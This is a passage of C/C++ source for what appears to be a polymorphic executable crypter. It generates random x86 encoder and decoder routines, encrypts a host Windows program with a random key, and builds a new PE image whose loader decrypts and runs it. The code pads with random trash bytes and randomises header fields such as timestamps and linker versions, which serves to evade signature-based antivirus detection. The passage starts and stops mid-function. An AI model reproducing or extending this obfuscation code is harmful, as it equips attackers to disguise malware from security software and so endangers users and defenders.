                        LDecoder[i].IType=CI_XOR_OFS;
                        break;

                case CI_ADD_OFS:
                        //DataRegister = DataRegister + OffsetRegister
                        //DataRegister = DataRegister - OffsetRegister
                        LDecoder[i].IType=CI_SUB_OFS;
                        break;

                case CI_SUB_OFS:
                        //DataRegister = DataRegister + OffsetRegister
                        //DataRegister = DataRegister - OffsetRegister
                        LDecoder[i].IType=CI_ADD_OFS;
                        break;

                case CI_XOR_SMH:
                        //DataRegister = DataRegister xor SmashRegister
                        LDecoder[i].IType=CI_XOR_SMH;
                        break;

                case CI_ADD_SMH:
                        //DataRegister = DataRegister + SmashRegister
                        //DataRegister = DataRegister - SmashRegister
                        LDecoder[i].IType=CI_SUB_SMH;
                        break;

                case CI_SUB_SMH:
                        //DataRegister = DataRegister + SmashRegister
                        //DataRegister = DataRegister - SmashRegister
                        LDecoder[i].IType=CI_ADD_SMH;
                        break;

                case CI_SMH_ADD:
                        //SmashRegister = SmashRegister + IArg1
                        LEncoder[i].IArg1=Random(0xFFFFFFFF);
                        //SmashRegister = SmashRegister - IArg1
                        LDecoder[i].IType=CI_SMH_SUB;
                        LDecoder[i].IArg1=LEncoder[i].IArg1;
                        break;

                case CI_SMH_SUB:
                        //SmashRegister = SmashRegister - IArg1
                        LEncoder[i].IArg1=Random(0xFFFFFFFF);
                        //SmashRegister = SmashRegister + IArg1
                        LDecoder[i].IType=CI_SMH_ADD;
                        LDecoder[i].IArg1=LEncoder[i].IArg1;
                        break;
                }
        }

        LPB=(PBYTE)(&LEncoderData);
        //stub
        PushReg32(LPB,REG_EBX);
        PushReg32(LPB,REG_ESI);
        PushReg32(LPB,REG_EDI);
        MovReg32RegMemIdx8(LPB,LCoderContext.DataAddrRegister,REG_ESP,0x10);
        MovReg32Num32(LPB,LCoderContext.DataSizeRegister,AHostSize);
        XorReg32Reg32(LPB,LCoderContext.OffsetRegister,LCoderContext.OffsetRegister);
        MovReg32Num32(LPB,LCoderContext.SmashRegister,LSmashNum);
        //main cycle
        LPB2=LPB;
        //load data
        MovReg32RegMem(LPB,LCoderContext.DataRegister,LCoderContext.DataAddrRegister);
        //generate encoder instructions
        for(i=0;i<LInstrCount;i++)
        {
                GenerateCoderInstruction(LEncoder,i);
        }
        //store data
        MovRegMemReg32(LPB,LCoderContext.DataAddrRegister,LCoderContext.DataRegister);
        //inc data ptr
        AddReg32Num8(LPB,LCoderContext.DataAddrRegister,4);
        //inc offset
        AddReg32Num8(LPB,LCoderContext.OffsetRegister,4);
        //end of data?
        CmpReg32Reg32(LPB,LCoderContext.OffsetRegister,LCoderContext.DataSizeRegister);
        RelJnzAddr32(LPB,DWORD(-((DWORD(LPB)+6)-DWORD(LPB2))));
        //ret
        MovReg32Reg32(LPB,REG_EAX,LCoderContext.SmashRegister);
        PopReg32(LPB,REG_EDI);
        PopReg32(LPB,REG_ESI);
        PopReg32(LPB,REG_EBX);
        Ret16(LPB,4);
        
        LEncSize=DWORD(LPB)-DWORD(&LEncoderData);
        OEncoder=(PCHAR)MyAlloc(LEncSize);
        if(OEncoder==NULL)
        {
                return(0);
        }
        CopyMemory(OEncoder,&LEncoderData,LEncSize);
        
        EncoderProc=(TEncoderProc)OEncoder;
        LSmashNum=EncoderProc(MainDataCyp);

        //-----------------------------------------------------------------
        LPB=(PBYTE)(&LDecoderData);
        //stub
        PopReg32(LPB,LCoderContext.DataAddrRegister);
        AddReg32Num32(LPB,LCoderContext.DataAddrRegister,AHostSize);
        MovReg32Num32(LPB,LCoderContext.DataSizeRegister,AHostSize);
        MovReg32Num32(LPB,LCoderContext.OffsetRegister,AHostSize);
        MovReg32Num32(LPB,LCoderContext.SmashRegister,LSmashNum);
        //main cycle
        LPB2=LPB;
        //dec offset
        SubReg32Num8(LPB,LCoderContext.OffsetRegister,4);
        //dec data ptr
        SubReg32Num8(LPB,LCoderContext.DataAddrRegister,4);
        //load data
        MovReg32RegMem(LPB,LCoderContext.DataRegister,LCoderContext.DataAddrRegister);
        //generate decoder instructions
        for(i=LInstrCount;i>0;i--)
        {
                GenerateCoderInstruction(LDecoder,i-1);
        }
        //store data
        MovRegMemReg32(LPB,LCoderContext.DataAddrRegister,LCoderContext.DataRegister);
        //end of data?
        TestReg32Reg32(LPB,LCoderContext.OffsetRegister,LCoderContext.OffsetRegister);
        RelJnzAddr32(LPB,DWORD(-((DWORD(LPB)+6)-DWORD(LPB2))));

        LDecSize=DWORD(LPB)-DWORD(&LDecoderData);

        ODecoder=(PCHAR)MyAlloc(LDecSize);
        if(ODecoder==NULL)
        {
                MyFree(OEncoder);
                OEncoder=NULL;
                return(0);
        }
        else
        {
                CopyMemory(ODecoder,&LDecoderData,LDecSize);

                return(LDecSize);
        }
}
//----------------------------------------------------------------------------------

//look for overlay data in MainData written at the end of original file
//fills AfterImageOverlays pointer its size - AfterImageOverlaysSize
void FindAfterImageOverlays()
{
        int i;
        PIMAGE_SECTION_HEADER LPSection;
        DWORD LMaxAddr,LDataSize;
        PIMAGE_DOS_HEADER LDOSHdr;
        PIMAGE_NT_HEADERS LHdr;

        AfterImageOverlays=NULL;
        AfterImageOverlaysSize=0;
        LMaxAddr=0;
        LDOSHdr=(PIMAGE_DOS_HEADER)MainData;
        LHdr=(PIMAGE_NT_HEADERS)(MainData+LDOSHdr->e_lfanew);
        LPSection=(PIMAGE_SECTION_HEADER)(PCHAR(&LHdr->OptionalHeader)+LHdr->FileHeader.SizeOfOptionalHeader);

        for(i=0;i<(int)LHdr->FileHeader.NumberOfSections;i++)
        {
                LDataSize=RoundSize(LPSection->SizeOfRawData,RawDataAlignment);
                if((LPSection->PointerToRawData+LDataSize)>LMaxAddr)
                {
                        LMaxAddr=LPSection->PointerToRawData+LDataSize;
                }
                LPSection++;
        }
        if((LMaxAddr>0)&&(LMaxAddr<MainRealSize))
        {
                AfterImageOverlays=PCHAR(MainData+LMaxAddr);
                AfterImageOverlaysSize=MainRealSize-LMaxAddr;
        }
}

//----------------------------------------------------------------
//The GetFunctionRVA function returns the relative virtual 
//address (RVA) of a Function with location pointer.
DWORD GetFunctionRVA(void* FuncName)
{
#ifdef _DEBUG
#ifdef _VC6LINKER
        return(DWORD(FuncName)+0x18);
#else
        return(DWORD(FuncName)+0x1E);
#endif
#else
        return(DWORD(FuncName)+0x6);
#endif
}

int _tmain(int argc, _TCHAR* argv[])
{
        int i;
        DWORD dw_temp;
        PCHAR ch_temp;
        if(!ProcessCmdLine(argc,argv)) 
        {
                Usage(InputFileName);
        }
        if(!Quiet) About();

        InitRandom();//very important for this prog :)

        MainFile=CreateFile(InputFileName
                                ,GENERIC_READ,FILE_SHARE_READ,
                                NULL,OPEN_EXISTING,0,0);

        if(MainFile!=INVALID_HANDLE_VALUE)
        {
                MainRealSize=GetFileSize(MainFile,NULL);
                
                if(!Quiet) printf("InputFile: %s (%d)",InputFileName,MainRealSize);

                MainRealSize4=MainRealSize;
                if((MainRealSize4 % 4)!=0) MainRealSize4+=4-MainRealSize4 % 4;

                MainSize=MainRealSize+Random(100)+10;
                MainData=(PCHAR)MyAlloc(MainSize);
                MainDataCyp=(PCHAR)MyAlloc(MainSize);
                
                
                if((MainData!=NULL)&&(MainDataCyp!=NULL))
                {
                        GenerateRandomBuffer((PBYTE&)MainData,MainSize);
                        ZeroMemory(MainData,MainRealSize4);

                        if(ReadFile(MainFile,MainData,MainRealSize,&NumBytes,NULL))
                        {
                                CloseHandle(MainFile);
                                MainFile=INVALID_HANDLE_VALUE;
                                CopyMemory(MainDataCyp,MainData,MainSize);
                                
                                if(CheckPEFile((PBYTE)MainData))
                                {
                                        //Ptr=MainData+DWORD(PImageDosHeader(MainData)->e_lfanew));
                                        ImageType=itExe;
                                        HostCharacteristics=pimage_nt_headers->FileHeader.Characteristics;
                                        if((HostCharacteristics&IMAGE_FILE_DLL)!=0) ImageType=itDLL;
                                        HostExportSectionVirtualAddress=pimage_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
                                        
                                        HostImageBase=pimage_nt_headers->OptionalHeader.ImageBase;
                                        HostSubsystem=pimage_nt_headers->OptionalHeader.Subsystem;
                                        HostSizeOfImage=pimage_nt_headers->OptionalHeader.SizeOfImage;
                                        HostImportSectionSize=pimage_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
                                        HostImportSectionVirtualAddress=pimage_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

                                        HostResourceSectionVirtualAddress=pimage_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress;

                                        if((HostSubsystem==IMAGE_SUBSYSTEM_WINDOWS_GUI)||
                                           (HostSubsystem==IMAGE_SUBSYSTEM_WINDOWS_CUI))
                                        {
                                                FindAfterImageOverlays();
                                                if (!Quiet)
                                                {
                                                        printf("\n");
                                                        printf("\nImageType: ");
                                                        switch(ImageType)
                                                        {
                                                                case itExe:
                                                                        printf("Executable");
                                                                        break;
                                                                        
                                                                case itDLL:
                                                                        printf("Dynamic Linking Library");
                                                                        break;
                                                                        
                                                                case itSys:
                                                                        printf("System Driver");
                                                                        break;
                                                                        
                                                                default: 
                                                                        printf("unknown");
                                                                        break;
                                                        }
                                                        
                                                        printf("\nSubsystem: ");
                                                        if(HostSubsystem==IMAGE_SUBSYSTEM_WINDOWS_GUI)
                                                        {
                                                                printf("Windows GUI");
                                                        }
                                                        else
                                                        {
                                                                printf("Windows character");
                                                        }
                                                }

                                                TlsSectionSize=pimage_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size;
                                                TlsSectionPresent=(TlsSectionSize!=0);
                                                
                                                ExportSectionPresent=FALSE;
                                                ExportSectionSize=0;
                                                ExportData=NULL;
                                                if(ImageType==itDLL)
                                                {
                                                        ExportSectionSize=pimage_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
                                                        ExportSectionPresent=(ExportSectionSize!=0);
                                                }

                                                ResourceSectionPresent=FALSE;
                                                HostResourceSectionSize=0;
                                                ResourceData=NULL;
                                                if((ImageType==itExe)||(ImageType==itDLL))
                                                {
                                                        HostResourceSectionSize=pimage_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].Size;
                                                        ResourceSectionPresent=(HostResourceSectionSize!=0);
                                                }

                                                OverlayPresent=((AfterImageOverlays!=NULL) && (AfterImageOverlaysSize>0));

                                                if(!Quiet)
                                                {
                                                        if(TlsSectionPresent)
                                                        {
                                                                printf("\n.tls section is present");
                                                                printf("\noriginal .tls section size: %d",TlsSectionSize);
                                                        }
                                                        else
                                                        {
                                                                printf("\n.tls section not present");
                                                        }

                                                        if(ExportSectionPresent)
                                                        {
                                                                if(!DynamicDLL)
                                                                {
                                                                        printf("\nexport section is present");
                                                                        printf("\noriginal export section size: %d",ExportSectionSize);
                                                                } 
                                                                else 
                                                                {
                                                                        printf("\nDynamic DLL - export section not used");
                                                                }
                                                        }
                                                        else
                                                        {
                                                                printf("\nexport section not present");
                                                        }

                                                        if(ResourceSectionPresent)
                                                        {
                                                                if(SaveIcon) 
                                                                {
                                                                        printf("\nresource section present");
                                                                }
                                                                else
                                                                {
                                                                        printf("\nresource section present but not used");
                                                                }
                                                        }
                                                        else 
                                                        {
                                                                printf("\nresource section not present");
                                                        }
                                                                
                                                        if(OverlayPresent)
                                                        {
                                                                if(SaveOverlay) 
                                                                {
                                                                        printf("\noverlay data present");
                                                                }
                                                                else
                                                                {
                                                                        printf("\noverlay data present but not used");
                                                                }
                                                        }
                                                        else printf("\noverlay data not present");
                                                }
                                                
                                                if(DynamicDLL) ExportSectionPresent=FALSE;
                                                if(!SaveIcon) ResourceSectionPresent=FALSE;
                                                if(!SaveOverlay) OverlayPresent=FALSE;

                                                if(ResourceSectionPresent)
                                                {
                                                        ResourceRoot=(PIMAGE_RESOURCE_DIRECTORY)
                                                                RVA2RAW(MainData,HostResourceSectionVirtualAddress);
                                                        ResourceDirEntry=(PIMAGE_RESOURCE_DIRECTORY_ENTRY)
                                                                RVA2RAW(MainData,HostResourceSectionVirtualAddress+sizeof(IMAGE_RESOURCE_DIRECTORY));
                                                        ResourceIconGroup=NULL;
                                                        ResourceXPManifest=NULL;
                                                        
                                                        for(i=0;i<ResourceRoot->NumberOfIdEntries+ResourceRoot->NumberOfNamedEntries;i++)
                                                        {
                                                                if((ResourceIconGroup==NULL)&&(ResourceDirEntry->Name==WORD(RT_GROUP_ICON)))
                                                                {
                                                                        ResourceIconGroup=(PIMAGE_RESOURCE_DIRECTORY)
                                                                                RVA2RAW(MainData,HostResourceSectionVirtualAddress+ResourceDirEntry->OffsetToDirectory);
                                                                }

                                                                if((ResourceXPManifest==NULL)&&(ResourceDirEntry->Name==WORD(RT_XP_MANIFEST)))
                                                                {
                                                                        ResourceXPManifest=(PIMAGE_RESOURCE_DIRECTORY)
                                                                                RVA2RAW(MainData,HostResourceSectionVirtualAddress+ResourceDirEntry->OffsetToDirectory);
                                                                }
                                                                
                                                                if(!((ResourceIconGroup==NULL)||(ResourceXPManifest==NULL))) break;
                                                                ResourceDirEntry++;
                                                        }
                                                        
                                                        if(!((ResourceIconGroup==NULL)&&(ResourceXPManifest==NULL)))
                                                        {
                                                                ResourceData=(PCHAR)MyAlloc(HostResourceSectionSize);
                                                                if(ResourceData==NULL)
                                                                {
                                                                        ErrorMsg("Unable to allocate memore for resource data");
                                                                        ResourceSectionPresent=FALSE;
                                                                }
                                                        }
                                                        else
                                                        {
                                                                ResourceSectionPresent=FALSE;
                                                        }
                                                        if(!ResourceSectionPresent)
                                                        {
                                                                if(!Quiet)
                                                                {
                                                                        printf("\nresource section has no icon or XP manifest");
                                                                }
                                                        }
                                                }

                                                MainDataDecoderLen=GenerateEncoderDecoder(MainRealSize4,MainDataEncoder,MainDataDecoder);
                                                
                                                if(MainDataDecoderLen!=0)
                                                {
                                                        LoaderRealSize=GetFunctionRVA(DynLoader_end)-GetFunctionRVA(DynLoader);
                                                        LoaderSize=LoaderRealSize+MainDataDecoderLen+Random(100)+4;
                                                        if ((LoaderSize % 4) >0 ) 
                                                        {
                                                                LoaderSize+=4-LoaderSize % 4;
                                                        }
                                                        if(!Quiet)
                                                        {
                                                                printf("\n");
                                                                printf("\nLoader size: %d",LoaderSize);
                                                        }
                                                                
                                                        LoaderData=(PCHAR)MyAlloc(LoaderSize);

                                                        if(LoaderData!=NULL)
                                                        {
                                                                GenerateRandomBuffer((PBYTE)LoaderData,LoaderSize);
                                                                dw_temp=GetFunctionRVA(DynLoader);
                                                                ch_temp=(PCHAR)dw_temp;
                                                                CopyMemory(LoaderData,ch_temp,LoaderRealSize);

                                                                MainDataDecPtr=LoaderData;
                                                                memcpy(&dw_temp,MainDataDecPtr,4);
                                                                while(dw_temp!=DYN_LOADER_DEC_MAGIC)
                                                                {
                                                                        MainDataDecPtr++;
                                                                        memcpy(&dw_temp,MainDataDecPtr,4);
                                                                }
                                                                DynLoaderDecoderOffset=DWORD(MainDataDecPtr)-DWORD(LoaderData);
                                                                dw_temp=GetFunctionRVA(DynLoader);
                                                                ch_temp=(PCHAR)dw_temp;
                                                                CopyMemory(MainDataDecPtr+MainDataDecoderLen,
                                                                        ch_temp+DynLoaderDecoderOffset+4,
                                                                        LoaderRealSize-DynLoaderDecoderOffset);
                                                                CopyMemory(MainDataDecPtr,
                                                                        MainDataDecoder,
                                                                        MainDataDecoderLen);

                                                                KeySize=(WORD)Random(200)+50;
                                                                KeyPtr=Random(200);
                                                                LoaderPtr=KeyPtr+KeySize;
                                                                Trash2Size=(WORD)Random(256)+20;
                                                         
                                                                if(!Quiet)
                                                                {
                                                                        printf("\nEncryption key size: %d",KeySize);
                                                                }
                                                                Key=(PCHAR)MyAlloc(KeySize);
                                                                if(Key!=NULL)
                                                                {
                                                                        GenerateKey((PBYTE)Key,KeySize);
                                                                        
                                                                        ZeroMemory(&DosHeader,sizeof(DosHeader));
                                                                        ZeroMemory(&NtHeaders,sizeof(NtHeaders));
                                                                        ZeroMemory(&DosStubEnd,sizeof(DosStubEnd));
                                                                        if(!Quiet)
                                                                        {
                                                                                printf("\n");
                                                                                printf("\nBuilding DOS header ...");
                                                                        }
                                                                        DosHeader.e_magic       = IMAGE_DOS_SIGNATURE;
                                                                        DosHeader.e_cblp        = 0x0050;
                                                                        DosHeader.e_cp          = 0x0002;
                                                                        DosHeader.e_cparhdr     = 0x0004;
                                                                        DosHeader.e_minalloc= 0x000F;
                                                                        DosHeader.e_maxalloc= 0xFFFF;
                                                                        DosHeader.e_sp          = 0x00B8;
                                                                        DosHeader.e_lfarlc      = 0x0040;
                                                                        DosHeader.e_ovno        = 0x001A;
                                                                        DosHeader.e_lfanew      = 0x0100;
                                                                        
                                                                        if(!Quiet) printf("\nBuilding NT headers ...");
                                                                        NtHeaders.Signature=IMAGE_NT_SIGNATURE;
                                                                        NtHeaders.FileHeader.Machine=IMAGE_FILE_MACHINE_I386;
                                                                        NtHeaders.FileHeader.NumberOfSections=2;
                                                                        if(TlsSectionPresent)
                                                                        {
                                                                                NtHeaders.FileHeader.NumberOfSections++;
                                                                        }
                                                                        if(ExportSectionPresent)
                                                                        {
                                                                                NtHeaders.FileHeader.NumberOfSections++;
                                                                        }
                                                                        if(ResourceSectionPresent)
                                                                        {
                                                                                NtHeaders.FileHeader.NumberOfSections++;
                                                                        }
                                                                        if(!Quiet)
                                                                        {
                                                                                printf("\nNumber of sections: %d",NtHeaders.FileHeader.NumberOfSections);
                                                                        }
                                                                        NtHeaders.FileHeader.TimeDateStamp=Random(0x20000000)+0x20000000;
                                                                        NtHeaders.FileHeader.SizeOfOptionalHeader=IMAGE_SIZEOF_NT_OPTIONAL_HEADER;
                                                                        NtHeaders.FileHeader.Characteristics=IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_LINE_NUMS_STRIPPED
                                                                                                                                                        | IMAGE_FILE_LOCAL_SYMS_STRIPPED | IMAGE_FILE_32BIT_MACHINE;
                                                                        switch(ImageType)
                                                                        {
                                                                        case itExe:
                                                                                NtHeaders.FileHeader.Characteristics=NtHeaders.FileHeader.Characteristics | IMAGE_FILE_RELOCS_STRIPPED;
                                                                                break;

                                                                        case itDLL:
                                                                                NtHeaders.FileHeader.Characteristics=NtHeaders.FileHeader.Characteristics | IMAGE_FILE_DLL;
                                                                                break;
                                                                        }
                                                                        RandomValue=Random(10);
                                                                        if(RandomValue>5)
                                                                        {
                                                                                NtHeaders.FileHeader.Characteristics=NtHeaders.FileHeader.Characteristics | IMAGE_FILE_BYTES_REVERSED_LO | IMAGE_FILE_BYTES_REVERSED_HI;
                                                                        }
                                                                 
                                                                        NtHeaders.OptionalHeader.Magic=IMAGE_NT_OPTIONAL_HDR_MAGIC;
                                                                        NtHeaders.OptionalHeader.MajorLinkerVersion=(BYTE)Random(9)+1;
                                                                        NtHeaders.OptionalHeader.MinorLinkerVersion=(BYTE)Random(99)+1;
                                                                        NtHeaders.OptionalHeader.BaseOfCode=0x00001000;                //may change
                                                                        if(ReqImageBase!=0) 
                                                                        {
                                                                                NtHeaders.OptionalHeader.ImageBase=RoundSize(ReqImageBase,0x00010000);
                                                                        }
                                                                        else
                                                                        {
                                                                                if(HostImageBase==0x00400000) 
                                                                                {
                                                                                        NtHeaders.OptionalHeader.ImageBase=RoundSize(HostImageBase+HostSizeOfImage+0x00100000,0x00010000);
                                                                                }       
                                                                                else
                                                                                {
                                                                                        NtHeaders.OptionalHeader.ImageBase=0x00400000;
                                                                                }
                                                                        }
                                                                        if(!Quiet)
                                                                        {
                                                                                printf("\nImageBase: 0x%x",NtHeaders.OptionalHeader.ImageBase);
                                                                        }
                                                                        NtHeaders.OptionalHeader.SectionAlignment=0x00001000;          //1000h = 4096
                                                                        NtHeaders.OptionalHeader.FileAlignment=0x00000200;             //may change 200h = 512
                                                                        NtHeaders.OptionalHeader.MajorOperatingSystemVersion=0x0004;
                                                                        NtHeaders.OptionalHeader.MajorSubsystemVersion=0x0004;
                                                                        NtHeaders.OptionalHeader.SizeOfHeaders=0x00000400;             //may change
                                                                        NtHeaders.OptionalHeader.Subsystem=HostSubsystem;
                                                                        NtHeaders.OptionalHeader.SizeOfStackReserve=0x00100000;
                                                                        NtHeaders.OptionalHeader.SizeOfStackCommit=0x00010000;         //may change
                                                                        NtHeaders.OptionalHeader.SizeOfHeapReserve=0x00100000;
                                                                        NtHeaders.OptionalHeader.SizeOfHeapCommit=0x00010000;
                                                                        NtHeaders.OptionalHeader.NumberOfRvaAndSizes=0x00000010;
                                                        
                                                                        if(!Quiet)
                                                                        {
                                                                                printf("\n");
                                                                                printf("\nBuilding .text section");
                                                                        }
                                                                        ZeroMemory(&CodeSection,sizeof(CodeSection));
                                                                        CopyMemory(&CodeSection.Name,".text",5); //may change -> CODE
                                                                        CodeSection.VirtualAddress=NtHeaders.OptionalHeader.BaseOfCode;
                                                                        CodeSection.PointerToRawData=NtHeaders.OptionalHeader.SizeOfHeaders;
                                                                        
                                                                        InitSize=Random(0x280)+0x280;
                                                                        CodeSection.SizeOfRawData=RoundSize(LoaderPtr+LoaderSize+Trash2Size+InitSize+MainSize,RawDataAlignment);
                                                                        CodeSectionVirtualSize=RoundSize(CodeSection.SizeOfRawData,NtHeaders.OptionalHeader.SectionAlignment);
                                                                        if(CodeSectionVirtualSize<HostSizeOfImage)
                                                                        {
                                                                                CodeSectionVirtualSize=RoundSize(HostSizeOfImage,NtHeaders.OptionalHeader.SectionAlignment);
                                                                        }
                                                                        CodeSection.Misc.VirtualSize=CodeSectionVirtualSize;
                                                                        
                                                                        NtHeaders.OptionalHeader.SizeOfCode=CodeSection.SizeOfRawData;
                                                                        
                                                                        CodeSection.Characteristics=IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ;
                                                                        if(!Quiet)
                                                                        {
                                                                                printf("\n.text section virtual address: 0x%x",CodeSection.VirtualAddress);
                                                                                printf("\n.text section virtual size: 0x%x",CodeSection.Misc.VirtualSize);
                                                                        }
                                                                        
                                                                        if(!Quiet)
                                                                        {
                                                                                printf("\n");
                                                                                printf("\nBuilding .idata section");
                                                                        }
                                                                
                                                                        NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress=
                                                                                CodeSection.VirtualAddress+CodeSection.Misc.VirtualSize;//may change
                                                                        
                                                                        ZeroMemory(&ImportSection,sizeof(ImportSection));
                                                                        ImportSection.VirtualAddress=
                                                                                NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
                                                                        ImportSectionData=(PCHAR)MyAlloc(HostImportSectionSize+0x70);
                                                                        ZeroMemory(ImportSectionData,HostImportSectionSize+0x70);
                                                                        ImportSectionDLLCount=1;
                                                                
                                                                        
                                                                        if((HostImportSectionSize!=0) && 
                                                                                (ImageType==itDLL)&& 
                                                                                (!DynamicDLL))
                                                                        {
                                                                                PB=MainData+VirtAddrToPhysAddr(MainData,HostImportSectionVirtualAddress);
                                                                                PImportDesc=(PIMAGE_IMPORT_DESCRIPTOR)PB;
                                                                                while (!((PImportDesc->Characteristics==0)&&(PImportDesc->TimeDateStamp==0)
                                                                                        &&(PImportDesc->ForwarderChain==0)&&(PImportDesc->Name==0)
                                                                                        &&(PImportDesc->FirstThunk==NULL)))
                                                                                {
                                                                                        PB2=MainData+VirtAddrToPhysAddr(MainData,PImportDesc->Name);
                                                                                        if((strcmp(UpperCase(PB2),UpperCase(Kernel32Name))==0)
                                                                                                &&(strcmp(UpperCase(PB2),UpperCase(NtdllName))==0))
                                                                                        {
                                                                                                ImportSectionDLLCount++;
                                                                                        }
                                                                                        PImportDesc++;
                                                                                }
                                                                        }
                                                                        PB=MainData+VirtAddrToPhysAddr(MainData,HostImportSectionVirtualAddress);
                                                                        PImportDesc=(PIMAGE_IMPORT_DESCRIPTOR)PB;
                                                                        PB2=ImportSectionData;
                                                                        ZeroMemory(&ImportDesc,sizeof(ImportDesc));
                                                                        ImportDesc.Characteristics=ImportSection.VirtualAddress+(ImportSectionDLLCount+1)*sizeof(ImportDesc);
                                                                        ImportDesc.Name=ImportSection.VirtualAddress+(ImportSectionDLLCount+1)*sizeof(ImportDesc)+(NumberOfImports+1+2*(ImportSectionDLLCount-1))*sizeof(IMAGE_THUNK_DATA)*2;
                                                                        ImportDesc.FirstThunk=ImportDesc.Characteristics+(NumberOfImports+1+2*(ImportSectionDLLCount-1))*sizeof(IMAGE_THUNK_DATA);
                                                                        InitcodeThunk=ImportDesc.FirstThunk;
                                                                        
                                                                        CopyMemory(PB2,&ImportDesc,sizeof(ImportDesc));
                                                                        PB2+=sizeof(ImportDesc);
                                                                        PB3=ImportSectionData+(ImportSectionDLLCount+1)*sizeof(ImportDesc);
                                                                        PB4=ImportSectionData+ImportDesc.Name-ImportSection.VirtualAddress;
                                                                        CopyMemory(PB4,Kernel32Name,Kernel32Size);
                                                                        PB4+=RoundSize(Kernel32Size+1,2);

                                                                        dw_temp=DWORD(PB4)-DWORD(ImportSectionData)+ImportSection.VirtualAddress-2;
                                                                        memcpy(PB3,&dw_temp,4);
                                                                        CopyMemory(PB4,GetProcAddressName,GetProcAddressSize);
                                                                        PB4+=RoundSize(GetProcAddressSize+1,2);
                                                                        PB3+=sizeof(DWORD);

                                                                        dw_temp=DWORD(PB4)-DWORD(ImportSectionData)+ImportSection.VirtualAddress-2;
                                                                        memcpy(PB3,&dw_temp,4);
                                                                        CopyMemory(PB4,LoadLibraryName,LoadLibrarySize);
                                                                        PB4+=RoundSize(LoadLibrarySize+1,2);
                                                                        PB3+=sizeof(DWORD);
                                                                        PB3+=sizeof(DWORD);


                                                                        if((HostImportSectionSize!=0)&&(ImageType==itDLL)&&(!DynamicDLL ))
                                                                        {
                                                                                for(i=2;i<=(int)ImportSectionDLLCount;i++)
                                                                                {
                                                                                        ZeroMemory(&ImportDesc,sizeof(ImportDesc));
                                                                                        ImportDesc.Characteristics=DWORD(PB3)-DWORD(ImportSectionData)+ImportSection.VirtualAddress;
                                                                                        ImportDesc.Name=DWORD(PB4)-DWORD(ImportSectionData)+ImportSection.VirtualAddress;
                                                                                        ImportDesc.FirstThunk=ImportDesc.Characteristics+(NumberOfImports+1+2*(ImportSectionDLLCount-1))*sizeof(IMAGE_THUNK_DATA);
                                                                                        CopyMemory(PB2,&ImportDesc,sizeof(ImportDesc));
                                                                                        PB2+=sizeof(ImportDesc);
                                                                        
                                                                                        while(TRUE)
                                                                                        {
                                                                                                PB=MainData+VirtAddrToPhysAddr(MainData,PImportDesc->Name);
                                                                                                if((strcmp(UpperCase(PB),UpperCase(Kernel32Name))==0)
                                                                                                        &&(strcmp(UpperCase(PB),UpperCase(NtdllName))==0))
                                                                                                {
                                                                                                        break;
                                                                                                }
                                                                                                PImportDesc++;
                                                                                        }
                                                                                        AnyDWORD=(DWORD)strlen(PB);
                                                                                        CopyMemory(PB4,PB,AnyDWORD);

                                                                                        PB4+=RoundSize(AnyDWORD+1,2);
                                                                                        PB=RVA2RAW(MainData,PImportDesc->FirstThunk);
                                                                                        memcpy(&dw_temp,PB,4);
                                                                                        if((dw_temp & 0x80000000)==0)
                                                                                        {
                                                                                                memcpy(&dw_temp,PB,4);
                                                                                                PB=RVA2RAW(MainData,dw_temp);
                                                                                                if(PB==NULL)
                                                                                                {
                                                                                                        PB=RVA2RAW(MainData,PImportDesc->OriginalFirstThunk);
                                                                                                        if(PB==NULL)
                                                                                                        {
                                                                                                                memcpy(&dw_temp,PB,4);
                                                                                                                if((dw_temp & 0x80000000)!=0)
                                                                                                                {
                                                                                                                        memcpy(PB3,PB,4);
                                                                                                                        PB=NULL;
                                                                                                                }
                                                                                                                else
                                                                                                                {
                                                                                                                        memcpy(&dw_temp,PB,4);
                                                                                                                        PB=RVA2RAW(MainData,dw_temp);
                                                                                                                }
                                                                                                        }
                                                                                                }
                                                                                                if(PB!=NULL)
                                                                                                {
                                                                                                        PB+=2;
                                                                                                        AnyDWORD=(DWORD)strlen(PB);
                                                                                                        dw_temp=DWORD(PB4)-DWORD(ImportSectionData)+ImportSection.VirtualAddress;
                                                                                                        memcpy(PB3,&dw_temp,4);
                                                                                                        PB4+=2;
                                                                                                        CopyMemory(PB4,PB,AnyDWORD);
                                                                                                        PB4+=RoundSize(AnyDWORD+1,2);
                                                                                                }
                                                                                        }
                                                                                        else
                                                                                        {
                                                                                                memcpy(PB3,PB,4);
                                                                                        }
                                                                                        PImportDesc++;
                                                                                        PB3+=sizeof(DWORD);
                                                                                        PB3+=sizeof(DWORD);
                                                                                }
                                                                        }
                                                                        
                                                                        PB3=ImportSectionData+(ImportSectionDLLCount+1)*sizeof(ImportDesc);
                                                                        PB=PB3;
                                                                        AnyDWORD=(NumberOfImports+1+2*(ImportSectionDLLCount-1))*sizeof(IMAGE_THUNK_DATA);
                                                                        PB+=AnyDWORD;
                                                                        CopyMemory(PB,PB3,AnyDWORD);
                                                                        ImportSectionDataSize=DWORD(PB4)-DWORD(ImportSectionData);
                                                                        
                                                                        CopyMemory(&ImportSection.Name,".idata",6);
                                                                        ImportSection.Misc.VirtualSize=RoundSize(ImportSectionDataSize,NtHeaders.OptionalHeader.SectionAlignment);
                                                                        ImportSection.SizeOfRawData=RoundSize(ImportSectionDataSize,RawDataAlignment);
                                                                        ImportSection.PointerToRawData=CodeSection.PointerToRawData+CodeSection.SizeOfRawData;
